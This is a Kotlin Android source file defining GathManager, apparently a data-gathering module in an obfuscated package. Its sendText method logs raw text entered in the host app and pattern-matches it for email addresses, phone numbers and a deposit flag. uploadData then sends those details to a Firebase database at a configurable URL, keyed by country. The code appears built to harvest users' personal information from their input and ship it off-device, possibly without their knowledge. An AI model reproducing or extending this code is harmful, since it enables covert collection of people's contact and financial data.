package io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe

import android.util.Log
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.lifecycleScope
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.MatcherOperations
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.common.firebase.UploadManager
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.data.source.local.repo.StoragePreferencesRepositoryImpl
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.domain.GathManagerInterface
import io.d485437e6782f66.a135d8c81ffe2908c8f96413c963a0ededfe.utils.enums.DataKey
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

internal class GathManager(
    private val storagePreferencesRepositoryImpl: StoragePreferencesRepositoryImpl
) : GathManagerInterface {
    override var emailCollectingEnabled: Boolean = false
    override var phoneCollectingEnabled: Boolean = false
    override var depositCollectingEnabled: Boolean = false
    override var customDatabaseUrl: String = ""


    private val tempMapOfText = mutableMapOf<String, String>()
    private val mutex = Mutex()
    private val uploadManager: (countryCode: String) -> UploadManager =
        { UploadManager(customDatabaseUrl, it) }
    var countryCode = ""

    private suspend fun saveCacheParent(parent: String) {
        storagePreferencesRepositoryImpl.getParent().ifBlank {
            storagePreferencesRepositoryImpl.setParent(parent)
        }
    }

    private suspend fun saveCacheEmail(email: String) {
        storagePreferencesRepositoryImpl.getEmail().ifBlank {
            storagePreferencesRepositoryImpl.setEmail(email)
        }
    }


    private suspend fun saveCachePhoneNumber(phoneNumber: String) {
        storagePreferencesRepositoryImpl.getPhone().ifBlank {
            storagePreferencesRepositoryImpl.setPhone(phoneNumber)
        }
    }

    private suspend fun saveCacheDeposit(depositValue: Boolean) {
        if (!storagePreferencesRepositoryImpl.getDeposit()) {
            storagePreferencesRepositoryImpl.setDeposit(depositValue)
        }
    }

    suspend fun checkAvailability(callback: () -> Unit) {
        checkCacheEmpty {
            if (emailCollectingEnabled || phoneCollectingEnabled || depositCollectingEnabled) {
                callback()
            }
        }
    }

    private suspend fun checkCacheEmpty(callback: () -> Unit) {
        val email = storagePreferencesRepositoryImpl.getEmail().isBlank() && emailCollectingEnabled
        val phoneNumber =
            storagePreferencesRepositoryImpl.getPhone().isBlank() && phoneCollectingEnabled
        val deposit =
            storagePreferencesRepositoryImpl.getDeposit().not() && depositCollectingEnabled

        if (email || phoneNumber || deposit) {
            callback()
        }
    }


    suspend fun sendText(
        id: String,
        value: String,
        emailMatches: (email: String) -> Unit,
        phoneMatches: (phone: String) -> Unit,
        depositMatches: (deposit: Boolean) -> Unit
    ) {
        mutex.withLock {
            checkCacheEmpty {
                Log.i("GathClient", "sendText: $value")
                tempMapOfText[id] = value

                if (phoneCollectingEnabled) {
                    MatcherOperations.Matches.checkPhone(tempMapOfText.values) { matchedPhone, rawValue ->
                        phoneMatches(matchedPhone)
                        tempMapOfText.values.remove(rawValue)
                    }
                }
                if (emailCollectingEnabled) {
                    MatcherOperations.Matches.checkEmail(tempMapOfText.values) { matchedEmail, rawValue ->
                        emailMatches(matchedEmail)
                        tempMapOfText.values.remove(rawValue)
                    }
                }
                if (depositCollectingEnabled) {
                    MatcherOperations.Matches.checkDeposit(tempMapOfText.values) { matchedDeposit, rawValue ->
                        depositMatches(matchedDeposit)
                        tempMapOfText.values.remove(rawValue)
                    }
                }
            }
        }
    }

    suspend fun uploadData(lifecycleOwner: LifecycleOwner, uploadKey: DataKey, data: Any) {
        mutex.withLock {

            val cacheParent =
                storagePreferencesRepositoryImpl.getParent().takeIf { it.isNotBlank() }
            val cacheEmail = storagePreferencesRepositoryImpl.getEmail()
            val cachePhoneNumber = storagePreferencesRepositoryImpl.getPhone()
            val cacheDeposit = storagePreferencesRepositoryImpl.getDeposit()

            when (uploadKey) {
                DataKey.EMAIL -> {
                    Log.i("GathClient", "uploadData: EMAIL $cacheParent")
                    saveCacheEmail(data as String)

                    uploadManager(countryCode).uploadToFirebase(
                        parentKey = cacheParent,
                        email = data,
                        phoneNumber = cachePhoneNumber,
                        deposit = cacheDeposit,
                    ) { newParent ->
                        lifecycleOwner.lifecycleScope.launch {
                            saveCacheParent(newParent)
                        }
                    }

                }
                DataKey.PHONE -> {
                    Log.d("GathClient", "uploadData: PHONE $cacheParent")
                    saveCachePhoneNumber(data as String)

                    uploadManager(countryCode).uploadToFirebase(
                        parentKey = cacheParent,
                        email = cacheEmail,
                        phoneNumber = data,
                        deposit = cacheDeposit,
                    ) { newParent ->
                        lifecycleOwner.lifecycleScope.launch {
                            saveCacheParent(newParent)
                        }
                    }
                }
                DataKey.DEPOSIT -> {
                    Log.d("GathClient", "uploadData: DEPOSIT $cacheParent")
                    saveCacheDeposit(data as Boolean)

                    uploadManager(countryCode).uploadToFirebase(
                        parentKey = cacheParent,
                        email = cacheEmail,
                        phoneNumber = cachePhoneNumber,
                        deposit = data,
                    ) { newParent ->
                        lifecycleOwner.lifecycleScope.launch {
                            saveCacheParent(newParent)
                        }
                    }
                }
            }
        }
    }


}